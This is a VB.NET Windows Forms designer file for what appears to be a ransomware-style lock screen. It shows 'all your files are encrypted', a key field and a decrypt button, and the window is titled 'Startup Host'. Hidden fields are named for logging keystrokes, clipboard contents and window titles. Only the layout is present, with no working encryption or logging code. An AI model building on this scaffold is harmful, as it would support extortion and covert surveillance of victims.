<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Main_Form
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Main_Form))
        Me.btn_Exit = New System.Windows.Forms.Button()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.secret_Key = New System.Windows.Forms.TextBox()
        Me.Box1 = New System.Windows.Forms.PictureBox()
        Me.Box2 = New System.Windows.Forms.PictureBox()
        Me.test_info = New System.Windows.Forms.Label()
        Me.SysFailure = New System.Windows.Forms.PictureBox()
        Me.Main_Head = New System.Windows.Forms.Label()
        Me.WarningPic = New System.Windows.Forms.PictureBox()
        Me.PictureBox2 = New System.Windows.Forms.PictureBox()
        Me.AnonMask = New System.Windows.Forms.PictureBox()
        Me.upTimeStatusCheck = New System.Windows.Forms.Timer(Me.components)
        Me.logClipboard = New System.Windows.Forms.TextBox()
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.debugExit = New System.Windows.Forms.PictureBox()
        Me.logWindowTitle = New System.Windows.Forms.TextBox()
        Me.Logger = New System.Windows.Forms.Timer(Me.components)
        Me.errLogs = New System.Windows.Forms.TextBox()
        Me.logConnectionx = New System.Windows.Forms.TextBox()
        Me.LabelUname = New System.Windows.Forms.Label()
        Me.LabelComName = New System.Windows.Forms.Label()
        Me.LabelScreen = New System.Windows.Forms.Label()
        Me.LabelOSv = New System.Windows.Forms.Label()
        Me.LabelRunTime = New System.Windows.Forms.Label()
        Me.LabelSysRoot = New System.Windows.Forms.Label()
        Me.LabelMemTotal = New System.Windows.Forms.Label()
        Me.LabelMemRemaining = New System.Windows.Forms.Label()
        Me.keyStroke = New System.Windows.Forms.TextBox()
        Me.LabelDateTime = New System.Windows.Forms.Label()
        Me.LabelLang = New System.Windows.Forms.Label()
        Me.LabelOS = New System.Windows.Forms.Label()
        Me.Panel2 = New System.Windows.Forms.Panel()
        Me.myClock = New System.Windows.Forms.Timer(Me.components)
        Me.Label_TotalTime = New System.Windows.Forms.Label()
        Me.Label_OverAllDuration = New System.Windows.Forms.Label()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.Box1, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.Box2, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.SysFailure, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.WarningPic, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.AnonMask, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.Panel1.SuspendLayout()
        CType(Me.debugExit, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'btn_Exit
        '
        Me.btn_Exit.Anchor = CType(((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.btn_Exit.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink
        Me.btn_Exit.BackColor = System.Drawing.Color.Black
        Me.btn_Exit.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center
        Me.btn_Exit.Cursor = System.Windows.Forms.Cursors.Hand
        Me.btn_Exit.FlatAppearance.BorderColor = System.Drawing.Color.White
        Me.btn_Exit.FlatAppearance.MouseDownBackColor = System.Drawing.Color.DarkGreen
        Me.btn_Exit.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Green
        Me.btn_Exit.Font = New System.Drawing.Font("TradeGothic LT Bold", 9.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Exit.ForeColor = System.Drawing.Color.White
        Me.btn_Exit.Location = New System.Drawing.Point(410, 527)
        Me.btn_Exit.Name = "btn_Exit"
        Me.btn_Exit.Size = New System.Drawing.Size(364, 34)
        Me.btn_Exit.TabIndex = 1
        Me.btn_Exit.Text = "D E C R Y P T"
        Me.btn_Exit.UseMnemonic = False
        Me.btn_Exit.UseVisualStyleBackColor = False
        '
        'PictureBox1
        '
        Me.PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Right
        Me.PictureBox1.BackColor = System.Drawing.Color.Transparent
        Me.PictureBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center
        Me.PictureBox1.Image = CType(resources.GetObject("PictureBox1.Image"), System.Drawing.Image)
        Me.PictureBox1.Location = New System.Drawing.Point(921, 48)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(278, 513)
        Me.PictureBox1.TabIndex = 1
        Me.PictureBox1.TabStop = False
        '
        'secret_Key
        '
        Me.secret_Key.Anchor = CType(((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.secret_Key.BackColor = System.Drawing.Color.Black
        Me.secret_Key.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.secret_Key.Font = New System.Drawing.Font("Metropolis Light", 12.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.secret_Key.ForeColor = System.Drawing.Color.ForestGreen
        Me.secret_Key.Location = New System.Drawing.Point(423, 471)
        Me.secret_Key.Name = "secret_Key"
        Me.secret_Key.PasswordChar = Global.Microsoft.VisualBasic.ChrW(42)
        Me.secret_Key.Size = New System.Drawing.Size(334, 16)
        Me.secret_Key.TabIndex = 0
        Me.secret_Key.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'Box1
        '
        Me.Box1.Anchor = CType(((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Box1.BackColor = System.Drawing.Color.Green
        Me.Box1.Location = New System.Drawing.Point(410, 451)
        Me.Box1.Name = "Box1"
        Me.Box1.Size = New System.Drawing.Size(364, 53)
        Me.Box1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.Box1.TabIndex = 2
        Me.Box1.TabStop = False
        '
        'Box2
        '
        Me.Box2.Anchor = CType(((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Box2.BackColor = System.Drawing.Color.Black
        Me.Box2.Location = New System.Drawing.Point(414, 457)
        Me.Box2.Name = "Box2"
        Me.Box2.Size = New System.Drawing.Size(354, 42)
        Me.Box2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.Box2.TabIndex = 3
        Me.Box2.TabStop = False
        '
        'test_info
        '
        Me.test_info.Anchor = CType(((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.test_info.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.test_info.Font = New System.Drawing.Font("Microsoft Sans Serif", 7.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.test_info.ForeColor = System.Drawing.Color.Gray
        Me.test_info.Location = New System.Drawing.Point(410, 571)
        Me.test_info.Name = "test_info"
        Me.test_info.Size = New System.Drawing.Size(364, 19)
        Me.test_info.TabIndex = 5
        Me.test_info.Text = "*all your files are encrypted. "
        Me.test_info.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        '
        'SysFailure
        '
        Me.SysFailure.Anchor = CType(((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.SysFailure.BackColor = System.Drawing.Color.Transparent
        Me.SysFailure.Image = CType(resources.GetObject("SysFailure.Image"), System.Drawing.Image)
        Me.SysFailure.Location = New System.Drawing.Point(-1, 119)
        Me.SysFailure.Name = "SysFailure"
        Me.SysFailure.Size = New System.Drawing.Size(1200, 316)
        Me.SysFailure.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage
        Me.SysFailure.TabIndex = 6
        Me.SysFailure.TabStop = False
        '
        'Main_Head
        '
        Me.Main_Head.Anchor = CType(((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Main_Head.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Main_Head.Font = New System.Drawing.Font("TradeGothic LT Bold", 24.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Main_Head.ForeColor = System.Drawing.Color.Red
        Me.Main_Head.Location = New System.Drawing.Point(268, 149)
        Me.Main_Head.Name = "Main_Head"
        Me.Main_Head.Size = New System.Drawing.Size(647, 46)
        Me.Main_Head.TabIndex = 4
        Me.Main_Head.Text = "No System is Safe"
        Me.Main_Head.TextAlign = System.Drawing.ContentAlignment.TopCenter
        Me.Main_Head.UseMnemonic = False
        '
        'WarningPic
        '
        Me.WarningPic.Anchor = CType(((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.WarningPic.BackColor = System.Drawing.Color.Transparent
        Me.WarningPic.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center
        Me.WarningPic.Image = CType(resources.GetObject("WarningPic.Image"), System.Drawing.Image)
        Me.WarningPic.Location = New System.Drawing.Point(367, 31)
        Me.WarningPic.Name = "WarningPic"
        Me.WarningPic.Size = New System.Drawing.Size(455, 88)
        Me.WarningPic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage
        Me.WarningPic.TabIndex = 7
        Me.WarningPic.TabStop = False
        '
        'PictureBox2
        '
        Me.PictureBox2.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.PictureBox2.BackColor = System.Drawing.Color.Transparent
        Me.PictureBox2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center
        Me.PictureBox2.Image = CType(resources.GetObject("PictureBox2.Image"), System.Drawing.Image)
        Me.PictureBox2.Location = New System.Drawing.Point(340, 298)
        Me.PictureBox2.Name = "PictureBox2"
        Me.PictureBox2.Size = New System.Drawing.Size(502, 124)
        Me.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage
        Me.PictureBox2.TabIndex = 8
        Me.PictureBox2.TabStop = False
        '
        'AnonMask
        '
        Me.AnonMask.Anchor = CType(((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left), System.Windows.Forms.AnchorStyles)
        Me.AnonMask.BackColor = System.Drawing.Color.Transparent
        Me.AnonMask.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center
        Me.AnonMask.Image = CType(resources.GetObject("AnonMask.Image"), System.Drawing.Image)
        Me.AnonMask.Location = New System.Drawing.Point(-1, 72)
        Me.AnonMask.Name = "AnonMask"
        Me.AnonMask.Size = New System.Drawing.Size(341, 468)
        Me.AnonMask.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.AnonMask.TabIndex = 9
        Me.AnonMask.TabStop = False
        '
        'upTimeStatusCheck
        '
        Me.upTimeStatusCheck.Interval = 1
        '
        'logClipboard
        '
        Me.logClipboard.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left), System.Windows.Forms.AnchorStyles)
        Me.logClipboard.BackColor = System.Drawing.Color.Black
        Me.logClipboard.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.logClipboard.Font = New System.Drawing.Font("Metropolis Light", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.logClipboard.ForeColor = System.Drawing.Color.ForestGreen
        Me.logClipboard.Location = New System.Drawing.Point(36, 524)
        Me.logClipboard.Multiline = True
        Me.logClipboard.Name = "logClipboard"
        Me.logClipboard.ReadOnly = True
        Me.logClipboard.ScrollBars = System.Windows.Forms.ScrollBars.Vertical
        Me.logClipboard.Size = New System.Drawing.Size(267, 53)
        Me.logClipboard.TabIndex = 6
        Me.logClipboard.Text = "[Clipboard]"
        Me.logClipboard.Visible = False
        '
        'Panel1
        '
        Me.Panel1.BackColor = System.Drawing.Color.Black
        Me.Panel1.Controls.Add(Me.debugExit)
        Me.Panel1.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel1.Location = New System.Drawing.Point(0, 0)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(1200, 35)
        Me.Panel1.TabIndex = 11
        '
        'debugExit
        '
        Me.debugExit.Anchor = CType((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.debugExit.Cursor = System.Windows.Forms.Cursors.Hand
        Me.debugExit.Image = CType(resources.GetObject("debugExit.Image"), System.Drawing.Image)
        Me.debugExit.Location = New System.Drawing.Point(1161, 6)
        Me.debugExit.Name = "debugExit"
        Me.debugExit.Size = New System.Drawing.Size(26, 29)
        Me.debugExit.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.debugExit.TabIndex = 0
        Me.debugExit.TabStop = False
        Me.debugExit.Visible = False
        '
        'logWindowTitle
        '
        Me.logWindowTitle.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left), System.Windows.Forms.AnchorStyles)
        Me.logWindowTitle.BackColor = System.Drawing.Color.Black
        Me.logWindowTitle.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.logWindowTitle.Font = New System.Drawing.Font("Metropolis Light", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.logWindowTitle.ForeColor = System.Drawing.Color.ForestGreen
        Me.logWindowTitle.Location = New System.Drawing.Point(36, 465)
        Me.logWindowTitle.Multiline = True
        Me.logWindowTitle.Name = "logWindowTitle"
        Me.logWindowTitle.ReadOnly = True
        Me.logWindowTitle.ScrollBars = System.Windows.Forms.ScrollBars.Vertical
        Me.logWindowTitle.Size = New System.Drawing.Size(267, 53)
        Me.logWindowTitle.TabIndex = 5
        Me.logWindowTitle.Text = "[Window Title]"
        Me.logWindowTitle.Visible = False
        '
        'Logger
        '
        Me.Logger.Interval = 1
        '
        'errLogs
        '
        Me.errLogs.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left), System.Windows.Forms.AnchorStyles)
        Me.errLogs.BackColor = System.Drawing.Color.Black
        Me.errLogs.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.errLogs.Font = New System.Drawing.Font("Metropolis Light", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.errLogs.ForeColor = System.Drawing.Color.ForestGreen
        Me.errLogs.Location = New System.Drawing.Point(36, 288)
        Me.errLogs.Multiline = True
        Me.errLogs.Name = "errLogs"
        Me.errLogs.ReadOnly = True
        Me.errLogs.ScrollBars = System.Windows.Forms.ScrollBars.Vertical
        Me.errLogs.Size = New System.Drawing.Size(267, 53)
        Me.errLogs.TabIndex = 2
        Me.errLogs.Text = "[Error Logs]"
        Me.errLogs.Visible = False
        '
        'logConnectionx
        '
        Me.logConnectionx.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left), System.Windows.Forms.AnchorStyles)
        Me.logConnectionx.BackColor = System.Drawing.Color.Black
        Me.logConnectionx.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.logConnectionx.Font = New System.Drawing.Font("Metropolis Light", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.logConnectionx.ForeColor = System.Drawing.Color.ForestGreen
        Me.logConnectionx.Location = New System.Drawing.Point(36, 406)
        Me.logConnectionx.Multiline = True
        Me.logConnectionx.Name = "logConnectionx"
        Me.logConnectionx.ReadOnly = True
        Me.logConnectionx.ScrollBars = System.Windows.Forms.ScrollBars.Vertical
        Me.logConnectionx.Size = New System.Drawing.Size(267, 53)
        Me.logConnectionx.TabIndex = 4
        Me.logConnectionx.Text = "[Connection]"
        Me.logConnectionx.Visible = False
        '
        'LabelUname
        '
        Me.LabelUname.AutoSize = True
        Me.LabelUname.BackColor = System.Drawing.Color.Transparent
        Me.LabelUname.Font = New System.Drawing.Font("Microsoft Sans Serif", 10.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.LabelUname.ForeColor = System.Drawing.Color.DarkGreen
        Me.LabelUname.Location = New System.Drawing.Point(33, 37)
        Me.LabelUname.Name = "LabelUname"
        Me.LabelUname.Size = New System.Drawing.Size(86, 17)
        Me.LabelUname.TabIndex = 15
        Me.LabelUname.Text = "Username:"
        '
        'LabelComName
        '
        Me.LabelComName.AutoSize = True
        Me.LabelComName.BackColor = System.Drawing.Color.Transparent
        Me.LabelComName.ForeColor = System.Drawing.Color.DimGray
        Me.LabelComName.Location = New System.Drawing.Point(32, 62)
        Me.LabelComName.Name = "LabelComName"
        Me.LabelComName.Size = New System.Drawing.Size(86, 13)
        Me.LabelComName.TabIndex = 16
        Me.LabelComName.Text = "Computer Name:"
        '
        'LabelScreen
        '
        Me.LabelScreen.AutoSize = True
        Me.LabelScreen.BackColor = System.Drawing.Color.Transparent
        Me.LabelScreen.ForeColor = System.Drawing.Color.DimGray
        Me.LabelScreen.Location = New System.Drawing.Point(32, 98)
        Me.LabelScreen.Name = "LabelScreen"
        Me.LabelScreen.Size = New System.Drawing.Size(44, 13)
        Me.LabelScreen.TabIndex = 17
        Me.LabelScreen.Text = "Screen:"
        '
        'LabelOSv
        '
        Me.LabelOSv.AutoSize = True
        Me.LabelOSv.BackColor = System.Drawing.Color.Transparent
        Me.LabelOSv.ForeColor = System.Drawing.Color.DimGray
        Me.LabelOSv.Location = New System.Drawing.Point(32, 116)
        Me.LabelOSv.Name = "LabelOSv"
        Me.LabelOSv.Size = New System.Drawing.Size(63, 13)
        Me.LabelOSv.TabIndex = 18
        Me.LabelOSv.Text = "OS Version:"
        '
        'LabelRunTime
        '
        Me.LabelRunTime.AutoSize = True
        Me.LabelRunTime.BackColor = System.Drawing.Color.Transparent
        Me.LabelRunTime.ForeColor = System.Drawing.Color.DimGray
        Me.LabelRunTime.Location = New System.Drawing.Point(33, 134)
        Me.LabelRunTime.Name = "LabelRunTime"
        Me.LabelRunTime.Size = New System.Drawing.Size(56, 13)
        Me.LabelRunTime.TabIndex = 19
        Me.LabelRunTime.Text = "Run Time:"
        '
        'LabelSysRoot
        '
        Me.LabelSysRoot.AutoSize = True
        Me.LabelSysRoot.BackColor = System.Drawing.Color.Transparent
        Me.LabelSysRoot.ForeColor = System.Drawing.Color.DimGray
        Me.LabelSysRoot.Location = New System.Drawing.Point(32, 152)
        Me.LabelSysRoot.Name = "LabelSysRoot"
        Me.LabelSysRoot.Size = New System.Drawing.Size(70, 13)
        Me.LabelSysRoot.TabIndex = 20
        Me.LabelSysRoot.Text = "System Root:"
        '
        'LabelMemTotal
        '
        Me.LabelMemTotal.AutoSize = True
        Me.LabelMemTotal.BackColor = System.Drawing.Color.Transparent
        Me.LabelMemTotal.ForeColor = System.Drawing.Color.DimGray
        Me.LabelMemTotal.Location = New System.Drawing.Point(32, 170)
        Me.LabelMemTotal.Name = "LabelMemTotal"
        Me.LabelMemTotal.Size = New System.Drawing.Size(116, 13)
        Me.LabelMemTotal.TabIndex = 22
        Me.LabelMemTotal.Text = "Total Physical Memory:"
        '
        'LabelMemRemaining
        '
        Me.LabelMemRemaining.AutoSize = True
        Me.LabelMemRemaining.BackColor = System.Drawing.Color.Transparent
        Me.LabelMemRemaining.ForeColor = System.Drawing.Color.DimGray
        Me.LabelMemRemaining.Location = New System.Drawing.Point(33, 188)
        Me.LabelMemRemaining.Name = "LabelMemRemaining"
        Me.LabelMemRemaining.Size = New System.Drawing.Size(142, 13)
        Me.LabelMemRemaining.TabIndex = 23
        Me.LabelMemRemaining.Text = "Remaining Physical Memory:"
        '
        'keyStroke
        '
        Me.keyStroke.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left), System.Windows.Forms.AnchorStyles)
        Me.keyStroke.BackColor = System.Drawing.Color.Black
        Me.keyStroke.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.keyStroke.Font = New System.Drawing.Font("Metropolis Light", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.keyStroke.ForeColor = System.Drawing.Color.ForestGreen
        Me.keyStroke.Location = New System.Drawing.Point(36, 347)
        Me.keyStroke.Multiline = True
        Me.keyStroke.Name = "keyStroke"
        Me.keyStroke.ReadOnly = True
        Me.keyStroke.ScrollBars = System.Windows.Forms.ScrollBars.Vertical
        Me.keyStroke.Size = New System.Drawing.Size(267, 53)
        Me.keyStroke.TabIndex = 3
        Me.keyStroke.Text = "[Key Press]"
        Me.keyStroke.Visible = False
        '
        'LabelDateTime
        '
        Me.LabelDateTime.AutoSize = True
        Me.LabelDateTime.BackColor = System.Drawing.Color.Transparent
        Me.LabelDateTime.ForeColor = System.Drawing.Color.DimGray
        Me.LabelDateTime.Location = New System.Drawing.Point(33, 206)
        Me.LabelDateTime.Name = "LabelDateTime"
        Me.LabelDateTime.Size = New System.Drawing.Size(80, 13)
        Me.LabelDateTime.TabIndex = 25
        Me.LabelDateTime.Text = "Date and Time:"
        '
        'LabelLang
        '
        Me.LabelLang.AutoSize = True
        Me.LabelLang.BackColor = System.Drawing.Color.Transparent
        Me.LabelLang.ForeColor = System.Drawing.Color.DimGray
        Me.LabelLang.Location = New System.Drawing.Point(33, 224)
        Me.LabelLang.Name = "LabelLang"
        Me.LabelLang.Size = New System.Drawing.Size(63, 13)
        Me.LabelLang.TabIndex = 26
        Me.LabelLang.Text = "Languages:"
        '
        'LabelOS
        '
        Me.LabelOS.AutoSize = True
        Me.LabelOS.BackColor = System.Drawing.Color.Transparent
        Me.LabelOS.ForeColor = System.Drawing.Color.DimGray
        Me.LabelOS.Location = New System.Drawing.Point(32, 80)
        Me.LabelOS.Name = "LabelOS"
        Me.LabelOS.Size = New System.Drawing.Size(25, 13)
        Me.LabelOS.TabIndex = 27
        Me.LabelOS.Text = "OS:"
        '
        'Panel2
        '
        Me.Panel2.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left), System.Windows.Forms.AnchorStyles)
        Me.Panel2.Location = New System.Drawing.Point(286, 288)
        Me.Panel2.Name = "Panel2"
        Me.Panel2.Size = New System.Drawing.Size(17, 289)
        Me.Panel2.TabIndex = 28
        '
        'myClock
        '
        Me.myClock.Interval = 1000
        '
        'Label_TotalTime
        '
        Me.Label_TotalTime.AutoSize = True
        Me.Label_TotalTime.BackColor = System.Drawing.Color.Transparent
        Me.Label_TotalTime.ForeColor = System.Drawing.Color.DimGray
        Me.Label_TotalTime.Location = New System.Drawing.Point(33, 242)
        Me.Label_TotalTime.Name = "Label_TotalTime"
        Me.Label_TotalTime.Size = New System.Drawing.Size(90, 13)
        Me.Label_TotalTime.TabIndex = 29
        Me.Label_TotalTime.Text = "Session Duration:"
        '
        'Label_OverAllDuration
        '
        Me.Label_OverAllDuration.AutoSize = True
        Me.Label_OverAllDuration.BackColor = System.Drawing.Color.Transparent
        Me.Label_OverAllDuration.ForeColor = System.Drawing.Color.DimGray
        Me.Label_OverAllDuration.Location = New System.Drawing.Point(33, 259)
        Me.Label_OverAllDuration.Name = "Label_OverAllDuration"
        Me.Label_OverAllDuration.Size = New System.Drawing.Size(86, 13)
        Me.Label_OverAllDuration.TabIndex = 30
        Me.Label_OverAllDuration.Text = "Overall Duration:"
        '
        'Main_Form
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink
        Me.BackColor = System.Drawing.Color.Black
        Me.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
        Me.ClientSize = New System.Drawing.Size(1200, 620)
        Me.Controls.Add(Me.Label_OverAllDuration)
        Me.Controls.Add(Me.Label_TotalTime)
        Me.Controls.Add(Me.Panel2)
        Me.Controls.Add(Me.LabelOS)
        Me.Controls.Add(Me.LabelLang)
        Me.Controls.Add(Me.LabelDateTime)
        Me.Controls.Add(Me.keyStroke)
        Me.Controls.Add(Me.LabelMemRemaining)
        Me.Controls.Add(Me.LabelMemTotal)
        Me.Controls.Add(Me.LabelSysRoot)
        Me.Controls.Add(Me.LabelRunTime)
        Me.Controls.Add(Me.LabelOSv)
        Me.Controls.Add(Me.LabelScreen)
        Me.Controls.Add(Me.LabelComName)
        Me.Controls.Add(Me.LabelUname)
        Me.Controls.Add(Me.logConnectionx)
        Me.Controls.Add(Me.errLogs)
        Me.Controls.Add(Me.logWindowTitle)
        Me.Controls.Add(Me.Panel1)
        Me.Controls.Add(Me.logClipboard)
        Me.Controls.Add(Me.btn_Exit)
        Me.Controls.Add(Me.secret_Key)
        Me.Controls.Add(Me.Box2)
        Me.Controls.Add(Me.Box1)
        Me.Controls.Add(Me.test_info)
        Me.Controls.Add(Me.AnonMask)
        Me.Controls.Add(Me.PictureBox2)
        Me.Controls.Add(Me.WarningPic)
        Me.Controls.Add(Me.Main_Head)
        Me.Controls.Add(Me.PictureBox1)
        Me.Controls.Add(Me.SysFailure)
        Me.ForeColor = System.Drawing.SystemColors.ControlLightLight
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Main_Form"
        Me.ShowInTaskbar = False
        Me.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Startup Host"
        Me.TransparencyKey = System.Drawing.Color.Fuchsia
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.Box1, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.Box2, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.SysFailure, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.WarningPic, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.AnonMask, System.ComponentModel.ISupportInitialize).EndInit()
        Me.Panel1.ResumeLayout(False)
        CType(Me.debugExit, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

    Friend WithEvents btn_Exit As Button
    Friend WithEvents PictureBox1 As PictureBox
    Friend WithEvents secret_Key As TextBox
    Friend WithEvents Box1 As PictureBox
    Friend WithEvents Box2 As PictureBox
    Friend WithEvents test_info As Label
    Friend WithEvents SysFailure As PictureBox
    Friend WithEvents Main_Head As Label
    Friend WithEvents WarningPic As PictureBox
    Friend WithEvents PictureBox2 As PictureBox
    Friend WithEvents AnonMask As PictureBox
    Friend WithEvents upTimeStatusCheck As Timer
    Friend WithEvents logClipboard As TextBox
    Friend WithEvents Panel1 As Panel
    Friend WithEvents logWindowTitle As TextBox
    Friend WithEvents Logger As Timer
    Friend WithEvents errLogs As TextBox
    Friend WithEvents debugExit As PictureBox
    Friend WithEvents logConnectionx As TextBox
    Friend WithEvents LabelUname As Label
    Friend WithEvents LabelComName As Label
    Friend WithEvents LabelScreen As Label
    Friend WithEvents LabelOSv As Label
    Friend WithEvents LabelRunTime As Label
    Friend WithEvents LabelSysRoot As Label
    Friend WithEvents LabelMemTotal As Label
    Friend WithEvents LabelMemRemaining As Label
    Friend WithEvents keyStroke As TextBox
    Friend WithEvents LabelDateTime As Label
    Friend WithEvents LabelLang As Label
    Friend WithEvents LabelOS As Label
    Friend WithEvents Panel2 As Panel
    Friend WithEvents myClock As Timer
    Friend WithEvents Label_TotalTime As Label
    Friend WithEvents Label_OverAllDuration As Label
End Class
